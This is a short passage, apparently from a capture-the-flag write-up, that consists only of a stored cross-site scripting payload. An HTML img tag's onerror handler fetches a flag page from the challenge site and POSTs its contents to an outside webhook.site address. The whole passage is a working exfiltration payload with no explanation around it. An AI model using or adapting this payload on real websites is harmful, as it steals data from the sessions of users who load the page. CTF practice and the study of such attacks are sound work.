...
```py
#Stored XSS
<img src=x onerror="fetch('https://markdown.web.actf.co/flag').then(response => console.log(response.status) || response).then(response => response.text()).then(body => fetch('https://webhook.site/*********-****-****-****-************',{method:'POST',body:body}))" >
```
